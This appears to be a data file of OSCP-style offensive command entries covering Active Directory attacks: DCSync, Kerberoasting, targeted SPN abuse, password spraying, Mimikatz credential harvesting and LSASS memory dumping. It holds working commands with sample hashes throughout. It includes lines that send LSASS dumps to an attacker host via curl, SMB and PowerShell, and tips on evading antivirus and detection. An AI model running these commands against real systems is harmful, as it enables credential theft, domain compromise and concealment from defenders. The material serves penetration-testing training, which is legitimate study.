- Check current user permissions:
<10 seconds (if PowerView loaded)
- Check specific user permissions:
<10 seconds
- List ALL principals with replication rights:
<15 seconds
- Grant DCSync permissions (ACL abuse):
<30 seconds
- Validate after granting:
<10 seconds
- TOTAL (permission check before DCSync):
**<30 seconds**

Always validate before attempting DCSync - 30 seconds of checking saves 5-10 minutes of troubleshooting failed attempts.

DETECTION AND OPSEC:
ACL ENUMERATION DETECTION:
- Event ID 4662:
""An operation was performed on an object"" (DS Access)
  - Object Type:
domain object (DC=corp,DC=com)
  - Access mask:
Read ACL
- VOLUME MATTERS:
Single ACL query is normal, 100+ queries in 10 seconds is suspicious
- OPSEC:
Query ACLs during enumeration phase (not immediately before DCSync)

GRANTING REPLICATION RIGHTS DETECTION (if doing ACL abuse):
- Event ID 5136:
""A directory service object was modified""
  - Attribute:
ntSecurityDescriptor (ACL modification)
  - Value:
Added DS-Replication-Get-Changes[All]
- Event ID 4662:
ACL modification on domain object
- HIGH VISIBILITY:
ACL changes on domain root object are HIGH-PRIORITY ALERTS in mature environments
- OPSEC:
Use existing DA/EA account instead of granting rights (cleaner, less detectable)

COMMON OSCP EXAM SCENARIO:
1.

COMPROMISE DOMAIN USER:
   impacket-GetNPUsers corp.com/ -dc-ip 192.168.50.70 -request
   # AS-REP roast, obtain user 'pete' hash

2.

CRACK HASH:
   hashcat -m 18200 pete_hash.txt rockyou.txt
   # Plaintext:
Password123

3.

VALIDATE PERMISSIONS:
   crackmapexec smb 192.168.50.70 -u pete -p Password123 --groups
   # Output:
pete is NOT in Domain Admins (no DCSync capability)

4.

LATERAL MOVEMENT (find DA):
   crackmapexec smb 192.168.50.0/24 -u pete -p Password123 --local-auth --sam
   # Dump SAM on multiple machines, find cached DA credentials

5.

OBTAIN DA CREDENTIALS:
   # Found:
administrator:2892d26cdf84d7a70e2eb3b9f05c425e (NTLM hash)

6.

VALIDATE DA CAN DCSYNC:
   crackmapexec smb 192.168.50.70 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e --groups
   # Output:
administrator is in Domain Admins ✓

7.

DCSYNC KRBTGT:
   impacket-secretsdump -just-dc-user krbtgt -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@192.168.50.70
   # Success:
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
8.

GOLDEN TICKET:
   # Use krbtgt hash for persistent access

The permission validation (step 6) confirms DA status BEFORE attempting DCSync, avoiding failed attempts and detection.

FINAL OSCP EXAM TIPS:
1.

**Always check permissions first**:
30 seconds of validation saves 10 minutes of troubleshooting
2.

**Verify group membership**:
whoami /groups OR crackmapexec --groups
3.

**Know default groups**:
Domain Admins = DCSync capability (no need to check ACLs)
4.

**Custom permissions are rare**:
In OSCP labs, DA/EA are the typical DCSync accounts
5.

**If check fails**:
Verify PowerView is loaded, check DN format, ensure network connectivity
6.

**Document findings**:
Create notes:
""User X can DCSync:
YES/NO""

PRACTICE EXERCISES:
1.

Load PowerView and run permission check on lab domain
2.

Check permissions for your user, Domain Admins group, and Enterprise Admins
3.

List ALL principals with replication rights (remove user filter)
4.

Practice converting SIDs to usernames (ConvertFrom-SID)
5.

Compare PowerView results with dsacls.exe output (verify consistency)
6.

Time yourself:
From PowerShell launch to permission check complete (<30 seconds target)","medium"
"ad-dcsync-check-domain-admins","Verify Domain Admin Membership","enumeration","net group ""Domain Admins"" /domain","List all members of the Domain Admins group to verify current user has required privileges for DCSync. Domain Admins have replication rights by default.","active-directory","ALWAYS verify Domain Admin membership BEFORE attempting DCSync. This saves time and avoids failed attack attempts that may generate alerts. If your user is NOT a Domain Admin, check for explicit replication rights assignment (rare but possible). Alternative high-privilege groups: Enterprise Admins (cross-forest), Administrators (domain-wide), Domain Controllers (computer accounts). Time estimate: <5 seconds.

MANUAL ALTERNATIVES:
PowerShell:
Get-ADGroupMember -Identity ""Domain Admins"" | Select Name, SamAccountName
Get-ADUser <USERNAME> -Properties MemberOf | Select -ExpandProperty MemberOf

Verify YOUR membership:
whoami /groups | findstr ""Domain Admins""
net user <USERNAME> /domain | findstr ""Domain Admins""

Impacket (Linux):
lookupsid.py <DOMAIN>/<USER>:<PASS>@<DC_IP>

TIME ESTIMATE: <5 seconds","high"
"ad-dcsync-check-user-groups","Check Current User's Group Memberships","enumeration","whoami /groups","Display all group memberships for the current user to verify Domain Admin or replication privileges. Native Windows command, no additional tools required.","active-directory","Fastest method to verify your OWN privileges without querying the domain controller. The security token contains all group memberships assigned at logon time. CRITICAL: Token is created at logon - if permissions changed after you logged in, whoami won't reflect new groups until you re-authenticate. For most current state, use 'net user <USERNAME> /domain' to query DC directly. Time estimate: Instant (<1 second).

MANUAL ALTERNATIVES:
Check specific group:
whoami /groups | findstr /I ""Domain Admins""
whoami /groups | findstr /I ""S-1-5-21-.*-512""

PowerShell:
[Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]) }

Verify privileges (alternative indicator):
whoami /priv | findstr SeBackupPrivilege
whoami /priv | findstr SeRestorePrivilege

Linux (after obtaining TGT):
klist
rpcclient -U <DOMAIN>/<USER>%<PASS> <DC_IP> -c 'getusername'

TIME ESTIMATE: <1 second","high"
"ad-dcsync-check-replication-rights","Verify Replication Rights (Advanced)","enumeration","powershell -c ""(Get-Acl 'AD:\<DOMAIN_DN>').Access | Where-Object {$_.IdentityReference -eq '<DOMAIN>\<USERNAME>' -and ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select IdentityReference, ActiveDirectoryRights, ObjectType""","Check for explicit replication rights assignment on domain object. Required only if user is NOT Domain Admin but may have custom replication permissions assigned.","active-directory","This check is RARELY needed in OSCP - most DCSync scenarios involve compromised Domain Admin accounts. Use this only if: (1) You have domain user creds but not DA, (2) Suspicious user has DCSync capability (red team defense evasion), (3) Investigating custom permission delegation. In real penetration tests, attackers occasionally find service accounts or helpdesk accounts with these rights assigned for legitimate backup purposes. Time estimate: 5-10 seconds.

MANUAL ALTERNATIVES:
Without PowerShell (dsacls.exe):
dsacls ""<DOMAIN_DN>"" | findstr /I ""<USERNAME>""
dsacls ""<DOMAIN_DN>"" | findstr /I ""1131f6aa-9c07-11d1-f79f-00c04fc2dcd2""

Query specific user:
Get-ADUser <USERNAME> -Properties * | Select Name, MemberOf, msDS-AllowedToDelegateTo

BloodHound (automated):
Find users with DCSync rights: MATCH (n:User)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name

Impacket (Linux):
python3 dacledit.py -action read -principal <USERNAME> -target ""<DOMAIN_DN>"" '<DOMAIN>/<USER>:<PASS>'

TIME ESTIMATE: 10-15 seconds (including RSAT module import)","medium"
"mimikatz-sekurlsa-logonpasswords","Mimikatz Extract Logon Passwords","post-exploit",".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""","Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory. Primary method for credential harvesting on compromised Windows systems. Requires local administrator privileges.","credential-harvesting","OSCP METHODOLOGY: Credential harvesting is MANDATORY on every compromised system with admin access. Service sessions are goldmines - Domain Admins often run scheduled tasks on workstations, caching credentials accessible to local admins. PATTERN: Local admin on ANY workstation = potential DA credential harvest.

TIME ESTIMATE: 2-5 minutes (1 min upload, 1 min execute, 1-3 min parse output)

MANUAL ALTERNATIVES:
1. LSASS dump: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\temp\lsass.dmp full
2. Parse offline: pypykatz lsa minidump lsass.dmp (on Kali)
3. Procdump: procdump64.exe -ma lsass.exe lsass.dmp

OUTPUT ANALYSIS:
- Session types: Interactive = RDP/console login, Service = scheduled task/service, RemoteInteractive = RDP
- Domain field: Filter for target domain (ignore NT AUTHORITY\SYSTEM, MicrosoftAccount\, etc.)
- NTLM hash format: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c (LM:NTLM)
- Use NTLM directly for Pass-the-Hash (no cracking needed)

EXAM TIPS:
- Save output to file: mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > creds.txt
- Use Evil-WinRM download to retrieve: download creds.txt
- Document ALL credentials immediately (usernames, domains, hashes, passwords)
- Test Pass-the-Hash before attempting password cracking (saves hours)","high"
"mimikatz-sekurlsa-tickets-export","Mimikatz Export Kerberos Tickets","post-exploit",".\mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export"" ""exit""","Export all Kerberos tickets (TGT and TGS) from LSASS memory to .kirbi files. Enables Pass-the-Ticket attacks and ticket manipulation. Alternative to password/hash-based authentication.","credential-harvesting","OSCP RELEVANCE: Pass-the-Ticket is less common in OSCP than Pass-the-Hash, but valuable when NTLM is disabled or for specific scenarios (e.g., reusing admin tickets).

TIME ESTIMATE: 3-5 minutes (1 min execute, 1 min download tickets, 1-3 min ticket analysis)

USING EXPORTED TICKETS:
1. WINDOWS: mimikatz.exe 'kerberos::ptt [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.COM.kirbi' (inject into current session)
2. LINUX: impacket-ticketConverter [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.COM.kirbi admin.ccache, then export KRB5CCNAME=admin.ccache
3. VERIFY: klist (Windows) or klist -c admin.ccache (Linux)

TICKET ANALYSIS:
- TGT (Type 2): Can request tickets for ANY service (most valuable)
- TGS (Type 0): Single service only (e.g., cifs/DC1 for SMB, http/WEBSERVER for HTTP)
- Look for: DA tickets, service account tickets, high-privilege user tickets

ALTERNATIVES:
- Rubeus.exe dump /service:krbtgt (modern C# alternative to Mimikatz)
- Rubeus.exe triage (list tickets without exporting)
- Invoke-Mimikatz -Command '""sekurlsa::tickets /export""' (PowerShell)

EXAM TIP: If you find TGT for Domain Admin, use it! Pass-the-Ticket can bypass some detection that catches Pass-the-Hash.","medium"
"mimikatz-privilege-debug","Mimikatz Enable Debug Privilege","utilities",".\mimikatz.exe ""privilege::debug"" ""exit""","Enable SeDebugPrivilege for current process. Prerequisite for LSASS memory access. Test command to verify Mimikatz will work before running credential extraction.","privilege-escalation","OSCP TIP: Always test 'privilege::debug' FIRST before attempting credential extraction. If this fails, you don't have proper admin rights - troubleshoot before running sekurlsa commands.

TIME ESTIMATE: 10 seconds

DEBUG WORKFLOW:
1. Verify local admin: whoami /groups | findstr Administrators
2. Test privilege: .\mimikatz.exe ""privilege::debug"" ""exit""
3. If success: Proceed with sekurlsa::logonpasswords
4. If failure: Troubleshoot admin rights

ALTERNATIVE CHECK:
- Windows: whoami /priv | findstr SeDebugPrivilege (should show 'Disabled' for admin)
- PowerShell: [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)","high"
"crackmapexec-validate-admin","CrackMapExec - Validate Credentials and Admin Rights","enumeration","crackmapexec smb <TARGET> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>","Validate domain credentials and check for local administrator privileges on target systems.
Pwn3d! indicator shows which systems grant local admin access.","active-directory","CRITICAL OSCP skill:
Validate credentials and identify local admin rights in one command.

PWND INDICATOR:
Pwn3d! means user has LOCAL ADMINISTRATOR privileges on the target system = full system compromise possible.

Output examples:
[+] corp.com\dave:Flowers1 = Valid credentials but NOT admin.

[+] corp.com\dave:Flowers1 (Pwn3d!) = Valid credentials AND local admin.

WHY THIS WORKS:
CrackMapExec authenticates via SMB and attempts to access ADMIN$ share or perform privileged operations.

If successful, user is local admin.

NOISE LEVEL:
Low for single validation check.

TIME ESTIMATE:
2-5 seconds per host.

SUBNET SCANNING:
Use CIDR notation to find systems where user is admin:
crackmapexec smb 192.168.50.0/24 -u dave -p 'Flowers1' -d corp.com.

This scans entire subnet and shows which systems display Pwn3d! OSCP TIP:
After password spraying, immediately validate found credentials to identify admin access.

Local admin on one workstation can lead to lateral movement and domain admin compromise.

BONUS:
Add --shares flag to see accessible shares, --sam to dump local password hashes (requires Pwn3d!), --lsa to dump cached domain credentials (requires Pwn3d!).

Example full validation:
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' -d <DOMAIN> --shares --sam --lsa","high"
"kerbrute-validate-creds","Kerbrute - Quick Credential Validation","enumeration","kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERFILE> '<PASSWORD>'","Rapidly validate domain credentials via Kerberos pre-authentication.
No full login required - minimal network footprint with just 2 UDP packets.","active-directory","FASTEST way to validate domain credentials without full authentication.

Uses Kerberos AS-REQ to test if credentials are valid.

ONLY 2 UDP PACKETS - stealthier than SMB/RDP login attempts.

NOISE LEVEL:
Minimal - only generates Event ID 4768 (TGT request) for valid creds or Event ID 4771 (pre-auth failed) for invalid.

SPEED:
<1 second for single validation.

LIMITATION:
Only validates credentials are correct, does NOT check admin rights (use crackmapexec-validate-admin for that).

WHY THIS WORKS:
Kerberos pre-authentication requires encrypted timestamp using user's password hash.

If credentials valid, KDC issues TGT.

If invalid, KDC returns pre-auth error.

TIME ESTIMATE:
<5 seconds.

USE CASES:
(1) Quick validation of credentials found during engagement.

(2) Batch validation of multiple username:password pairs.

(3) Pre-check before attempting noisy SMB/RDP login.

OSCP TIP:
Use this for QUICK validation (""are these creds valid?""), then use crackmapexec-validate-admin to check if user is local admin somewhere.

Kerbrute doesn't show admin rights, only credential validity.

For single user validation, create file:
echo 'pete' > user.txt && kerbrute passwordspray -d corp.com --dc 192.168.50.70 user.txt 'Nexus123!'","high"
"impacket-getuserspns-kerberoast","impacket-GetUserSPNs - Kerberoasting Attack","password-attacks","sudo impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>","Request and extract TGS-REP hashes for service accounts (Kerberoasting)","active-directory","KERBEROASTING extracts TGS-REP hashes from service accounts.

WHY THIS WORKS:
Any authenticated domain user can request TGS (service ticket) for ANY SPN in the domain.

The TGS is encrypted with the service account's password hash.

No permission checks at TGS request time - checks only happen when accessing the actual service.

This allows offline hash cracking.

TARGET ACCOUNTS:
Service accounts with SPNs (SQL Server, IIS, custom services).

CRITICAL DISTINCTION:
Computer accounts (MACHINE$) and Managed Service Accounts (MSAs) use 120-character random passwords - effectively uncrackable.

Focus on USER accounts with SPNs (iis_service, sql_service, etc.).

HASH FORMAT:
Output is $krb5tgs$23$ (Kerberos 5 TGS-REP etype 23 = RC4-HMAC).

Use Hashcat mode 13100.

RC4 VS AES:
Accounts with 'msDS-SupportedEncryptionTypes' attribute set to AES will return AES-encrypted tickets (harder to crack).

Use Rubeus with /tgtdeleg flag to force RC4 (see rubeus-kerberoast-aes).

OSCP TIP:
Kerberoasting is HIGH-PRIORITY attack - fast to execute (30 seconds), often successful (weak service account passwords common), and requires only domain user credentials.

TIME ESTIMATE:
10-30 seconds for hash extraction + 1-120 minutes for cracking (depends on password).

DETECTION:
Event ID 4769 (TGS request) - normal Kerberos traffic, difficult to distinguish from legitimate service access.

STEALTH:
Very low detection risk.

OUTPUT ANALYSIS:
Look for accounts in privileged groups (memberof column).

Service accounts are often over-privileged (Domain Admins, local admins on multiple systems).

Clock sync is CRITICAL - use ntpdate or rdate if KRB_AP_ERR_SKEW errors occur.","high"
"impacket-getuserspns-list","impacket-GetUserSPNs - List SPNs Only","enumeration","sudo impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME>","Enumerate service principal names without requesting TGS tickets","active-directory","SPN ENUMERATION ONLY - lists service accounts without extracting hashes.

Use this for:
(1) Reconnaissance before Kerberoasting.

(2) Identifying high-value targets.

(3) Checking if Kerberoasting is viable.

OUTPUT COLUMNS:
ServicePrincipalName (service type and hostname), Name (account name), MemberOf (group membership - look for admin groups), PasswordLastSet (old = weak password likely), LastLogon (active account check).

SPN FORMAT:
protocol/hostname:port (e.g., HTTP/web04.corp.com:80, MSSQLSvc/sql01.corp.com:1433).

TARGET SELECTION:
Prioritize accounts with:
(1) Old PasswordLastSet dates (>1 year = weak password likely).

(2) Privileged group membership (Domain Admins, Enterprise Admins).

(3) Generic service names (sql_service, iis_service often have weak passwords like 'Password1!').

COMPUTER ACCOUNTS:
Ignore SPNs registered to computer accounts (ending in $) - these have 120-character random passwords.

OSCP STRATEGY:
Run enumeration FIRST to identify targets, then use -request flag for hash extraction.

TIME ESTIMATE:
<5 seconds.

NO HASH EXTRACTION:
Add -request flag to extract TGS-REP hashes (see impacket-getuserspns-kerberoast).

DETECTION:
Minimal - standard LDAP queries for SPN attribute, Event ID 4662 (directory service access).","high"
"rubeus-kerberoast","Rubeus - Kerberoasting (Windows)","password-attacks",".\Rubeus.exe kerberoast /outfile:<OUTPUT_FILE>","Extract TGS-REP hashes from Windows using Rubeus","active-directory","WINDOWS-BASED KERBEROASTING using Rubeus.exe.

ADVANTAGES OVER IMPACKET:
(1) No credentials needed (uses current user context).

(2) Faster from Windows (native Kerberos API).

(3) No time sync issues.

(4) Auto-discovers SPNs.

EXECUTION CONTEXT:
Run from domain-joined Windows system OR use runas /netonly.

TOOL LOCATION:
C:\Tools\Rubeus.exe on OSCP lab systems.

Download:
https://github.com/GhostPack/Rubeus.

HASH OUTPUT:
Hashcat mode 13100 compatible by default.

AES VS RC4:
Modern domains return AES-encrypted tickets (Supported ETypes:
RC4_HMAC_DEFAULT vs AES256_CTS_HMAC_SHA1_96).

AES is stronger and slower to crack.

Use /tgtdeleg flag to force RC4 downgrade (see rubeus-kerberoast-aes).

OSCP TIP:
Rubeus preferred when you have RDP/WinRM access to Windows.

No credentials needed, no time sync.

OUTPUT ANALYSIS:
Look for 'Supported ETypes:
RC4_HMAC_DEFAULT' (easier to crack) vs AES (harder).

Target RC4 accounts first.

TIME ESTIMATE:
10-30 seconds for hash extraction.

AV EVASION:
Rubeus flagged by Windows Defender.

Options:
(1) Disable AV.

(2) Obfuscated version.

(3) Reflective loading.

(4) Fall back to impacket from Linux.

MULTIPLE ACCOUNTS:
Rubeus automatically finds ALL SPNs linked to user accounts and extracts hashes sequentially.

Hash saved to /outfile path specified.

DETECTION:
Event ID 4769 (TGS request) - normal Kerberos traffic, low visibility.","high"
"rubeus-kerberoast-aes","Rubeus - Kerberoasting with RC4 Downgrade","password-attacks",".\Rubeus.exe kerberoast /tgtdeleg /outfile:<OUTPUT_FILE>","Force RC4 encryption for AES-enabled accounts using TGT delegation","active-directory","RC4 DOWNGRADE TECHNIQUE for accounts configured to use AES encryption.

WHY THIS MATTERS:
AES-encrypted TGS tickets are SLOWER to crack than RC4 (10-100x slower depending on hardware).

Modern domains default to AES for stronger security.

RC4 is legacy but still supported for backward compatibility.

/tgtdeleg MECHANISM:
Requests TGT with constrained delegation flag, then uses that TGT to request TGS.

The delegation TGT forces RC4 encryption regardless of account's encryption type setting.

WHEN TO USE:
(1) Rubeus kerberoast shows 'Supported ETypes:
AES256_CTS_HMAC_SHA1_96'.

(2) You have limited time for cracking (OSCP exam).

(3) Weak password suspected (worth trying faster cracking method).

OSCP TIP:
Try /tgtdeleg FIRST to get RC4 hashes.

If it fails, fall back to standard kerberoasting with AES hashes.

TIME SAVINGS:
RC4 cracking is ~10x faster than AES.

Example:
rockyou.txt with rules takes 3 hours for RC4 vs 30+ hours for AES.

DETECTION:
Same as standard Kerberoasting - Event ID 4769 (TGS request).

TGT delegation adds Event ID 4768 (TGT request) but still normal Kerberos traffic.

HASH FORMAT:
Output is still Hashcat mode 13100 ($krb5tgs$23$ = etype 23 = RC4-HMAC).

AES would be mode 19600/19700.

LIMITATIONS:
Some hardened domains disable RC4 entirely (enforce AES-only).

In this case, /tgtdeleg will fail and you must crack AES hashes.

NOT ALWAYS NEEDED:
Check 'Supported ETypes' in standard Rubeus output.

If already RC4_HMAC_DEFAULT, no need for /tgtdeleg.","medium"
"powerview-kerberoast","PowerView - Invoke-Kerberoast","password-attacks","Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash","Kerberoasting using PowerView PowerShell module","active-directory","POWERVIEW-BASED KERBEROASTING.

ADVANTAGES:
(1) Pure PowerShell (no exe upload).

(2) Integrated with PowerView enumeration.

(3) Flexible output formats.

DISADVANTAGES:
(1) Slower than Rubeus.

(2) PowerView often flagged by AV.

(3) Requires PowerView import.

POWERVIEW LOCATION:
C:\Tools\PowerView.ps1 on lab systems OR download from PowerSploit.

IMPORT:
Import-Module .\PowerView.ps1 OR dot-source:
.

.\PowerView.ps1.

EXECUTION POLICY:
May need bypass:
powershell -ep bypass -c 'Import-Module .\PowerView.ps1; Invoke-Kerberoast -OutputFormat Hashcat'.

OUTPUT:
Default shows SamAccountName, ServicePrincipalName, Hash.

Use Select-Object -ExpandProperty Hash for hash-only output.

OSCP TIP:
Rubeus is generally preferred (faster, cleaner output).

Use PowerView when:
(1) Rubeus blocked by AV.

(2) Already using PowerView for other enumeration.

(3) Need PowerShell-only solution.

SAVE TO FILE:
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File hashes.txt.

TIME ESTIMATE:
30-60 seconds for hash extraction (slower than Rubeus).

DETECTION:
Event ID 4769 (TGS request) - normal Kerberos traffic.

PowerView import may trigger Event ID 4104 (PowerShell script block logging) if enabled.

ALTERNATIVE SYNTAX:
Get-DomainSPNTicket (older PowerView cmdlet, same functionality).","medium"
"setspn-list-user-spns","setspn - List Service Principal Names","enumeration","setspn -Q */*","Enumerate SPNs using Windows built-in setspn.exe","active-directory","BUILT-IN SPN ENUMERATION using setspn.exe (no tools needed).

ADVANTAGES:
(1) Built into Windows (no upload).

(2) Legitimate admin tool (low suspicion).

(3) No AV flags.

(4) Works on very old Windows versions.

DISADVANTAGES:
(1) Shows ALL SPNs (computer + user accounts - requires manual filtering).

(2) No automatic hash extraction.

(3) Verbose output.

OUTPUT FORMAT:
Shows CN= (common name), servicePrincipalName, and DN (distinguished name).

FILTERING USER ACCOUNTS:
Look for CN= lines without $ (computer accounts end in $).

Example:
CN=iis_service vs CN=WEB01$ (computer).

COMMON SPN TYPES:
HTTP/ (web servers, IIS), MSSQLSvc/ (SQL Server), WSMAN/ (WinRM), HOST/ (multiple services), TERMSRV/ (RDP), RestrictedKrbHost/ (Kerberos-constrained delegation).

OSCP TIP:
Use setspn for initial reconnaissance when Rubeus/impacket unavailable.

Note user account SPNs, then use Rubeus/impacket for hash extraction.

MANUAL FILTERING:
setspn -Q */* | findstr /V '$' | findstr 'CN=' (remove computer accounts, show only CN lines).

TIME ESTIMATE:
5-15 seconds depending on domain size.

DETECTION:
Legitimate admin activity - Event ID 4662 (directory service access).

Very low suspicion.

ALTERNATIVE:
setspn -T corp.com -Q */* (specify domain explicitly).","medium"
"targeted-kerberoast-set","Targeted Kerberoasting - Set SPN on User Account","privilege-escalation","Set-DomainObject -Identity <USERNAME> -Set @{serviceprincipalname='HTTP/<HOSTNAME>'} -Verbose","Add service principal name to user account for targeted Kerberoasting (requires GenericWrite/GenericAll)","active-directory","TARGETED KERBEROASTING attack for scenarios where no existing SPNs on user accounts.

REQUIREMENTS:
GenericWrite OR GenericAll permissions on target user.

ATTACK FLOW:
(1) Identify user you have write permissions on.

(2) Add fake SPN.

(3) Extract TGS hash with Rubeus/impacket.

(4) Crack hash offline.

(5) CLEANUP:
Remove SPN (CRITICAL - see targeted-kerberoast-cleanup).

SPN FORMAT:
protocol/hostname format (e.g., HTTP/fake.corp.com).

Hostname doesn't need to exist - AD doesn't validate.

Protocol can be any string.

ETHICAL NOTE:
Modifies production AD.

ALWAYS remove SPN after obtaining hash.

Document in assessment notes.

OSCP SCENARIO:
Common with delegated permissions, service account management, misconfigured ACLs.

PERMISSION CHECK:
Get-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (whoami /user)[1]} | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}.

TIME ESTIMATE:
5 seconds to add SPN + 10 seconds to extract hash + 1-120 minutes to crack.

DETECTION:
Event ID 4742 (computer account changed) or 4738 (user account changed) - shows servicePrincipalName modification.

SUSPICIOUS if arbitrary SPN added to standard user account.

CLEANUP CRITICAL:
Failing to remove SPN leaves permanent modification in AD.

Set reminder or use auto-cleanup script.

ALTERNATIVE:
Set-ADUser -Identity <USERNAME> -ServicePrincipalNames @{Add='HTTP/fake.corp.com'} (native AD PowerShell module, same result).

MULTIPLE SPNs:
User can have multiple SPNs.

Use -Append instead of -Set to add without removing existing SPNs (rare scenario).","medium"
"targeted-kerberoast-cleanup","Targeted Kerberoasting - Remove SPN (Cleanup)","cleanup","Set-DomainObject -Identity <USERNAME> -Clear serviceprincipalname -Verbose","Remove service principal name added during targeted Kerberoasting attack","active-directory","CRITICAL CLEANUP STEP after targeted Kerberoasting.

-Clear OPERATION:
Removes ALL SPNs from account.

If account had legitimate SPNs before your attack, use -Set @{serviceprincipalname='original_spn'} instead of -Clear to restore original.

VERIFICATION:
Get-DomainUser -Identity <USERNAME> -Properties serviceprincipalname.

Should show no serviceprincipalname attribute OR empty value.

OSCP REQUIREMENT:
Always document cleanup in assessment report.

Show before/after SPN values as evidence.

AUTOMATION:
Create cleanup script:
Start-Sleep -Seconds 1800; Set-DomainObject -Identity <USERNAME> -Clear serviceprincipalname (auto-cleanup after 30 min).

TIME TO CLEANUP:
<5 seconds.

WHY CLEANUP MATTERS:
(1) Ethical requirement - restore environment to original state.

(2) Detection - arbitrary SPNs on user accounts are suspicious.

(3) Functionality - fake SPNs may interfere with legitimate services.

FAILED CLEANUP:
If you lose access before cleanup, document in report and notify client immediately.

Provide manual steps:
Open ADUC → Find user → Properties → Attribute Editor → servicePrincipalName → Remove values.

VERIFICATION COMMAND:
(Get-DomainUser -Identity <USERNAME> -Properties serviceprincipalname).serviceprincipalname (should return $null or empty).

ALTERNATIVE:
Set-ADUser -Identity <USERNAME> -ServicePrincipalNames @{Remove='HTTP/fake.corp.com'} (removes specific SPN, preserves others if they exist).

RESTORE ORIGINAL:
If account had legitimate SPN before attack, use Get-DomainUser output from BEFORE attack to restore exact original value.","high"
"ad-lsass-dump-procdump","Dump LSASS Memory with ProcDump","post-exploit","procdump.exe -accepteula -ma lsass.exe lsass.dmp","Create memory dump of LSASS process using Sysinternals ProcDump. Contains cleartext passwords, NTLM hashes, and Kerberos tickets for all logged-in users. Transfer to Kali for offline Mimikatz analysis.","credential-dumping","PREFERRED LSASS dumping method when Mimikatz is blocked by AV. ProcDump is Microsoft-signed and legitimate admin tool - bypasses most AV. OSCP WORKFLOW: (1) Get SYSTEM shell (psexec -s -i cmd), (2) procdump lsass, (3) Transfer to Kali (SMB server or HTTP upload), (4) Run Mimikatz on Kali: mimikatz.exe 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords' exit. ADVANTAGES: No AV alerts, offline analysis (no LSASS manipulation on target), forensically cleaner. DISADVANTAGES: Large file transfer (40-200MB), requires stable shell for transfer. Time estimate: 10-30 seconds (dump) + 30-180 seconds (transfer depending on connection).

MANUAL ALTERNATIVES:

Find LSASS PID first (if antivirus monitors 'lsass.exe' string):
tasklist /fi ""imagename eq lsass.exe""
procdump.exe -accepteula -ma <PID> lsass.dmp

Dump with compression (smaller transfer):
procdump.exe -accepteula -ma lsass.exe lsass.dmp
powershell Compress-Archive -Path lsass.dmp -DestinationPath lsass.zip

Direct dump to SMB share (no local storage):
smbserver.py share /tmp/ (on Kali)
procdump.exe -accepteula -ma lsass.exe \\<LHOST>\share\lsass.dmp

Dump to temp directory (avoid permission issues):
procdump.exe -accepteula -ma lsass.exe %TEMP%\lsass.dmp
cd %TEMP% && copy lsass.dmp \\<LHOST>\share\

Process on Kali with Mimikatz (Windows binary via Wine):
wine mimikatz.exe ""sekurlsa::minidump lsass.dmp"" ""sekurlsa::logonpasswords"" ""exit"" > creds.txt

Process on Kali with pypykatz (Python alternative):
pypykatz lsa minidump lsass.dmp > creds.txt

WDigest cleartext password extraction:
# Windows 2008 R2 and earlier store cleartext passwords in LSASS (WDigest)
mimikatz.exe ""sekurlsa::minidump lsass.dmp"" ""sekurlsa::wdigest"" ""exit""

Kerberos ticket extraction:
mimikatz.exe ""sekurlsa::minidump lsass.dmp"" ""sekurlsa::tickets /export"" ""exit""

OPSEC CONSIDERATIONS:
- Event ID 10 (process access) logged when LSASS accessed
- Sysmon Event ID 10 (LSASS access) if Sysmon deployed
- Defenders monitor for: lsass.exe in command line, procdump.exe accessing lsass, large .dmp files in unusual locations
- Mitigation: Use alternate names (svchost.dmp), delete after transfer, dump to user profile (blend with legitimate activity)

FILE TRANSFER OPTIONS:
1. SMB: copy lsass.dmp \\<LHOST>\share\ (fastest for large files)
2. HTTP upload: curl -X POST -F file=@lsass.dmp http://<LHOST>:8080/upload
3. certutil encode: certutil -encode lsass.dmp lsass.txt (base64, then copy/paste)
4. PowerShell: Invoke-WebRequest -Uri http://<LHOST>:8080/upload -Method POST -InFile lsass.dmp

TIME ESTIMATE:
Dump: 10-30 seconds (depends on LSASS size)
Transfer: 30-180 seconds (40-200MB file, depends on connection speed)
Mimikatz processing: 5-15 seconds
Total: 1-4 minutes","high"
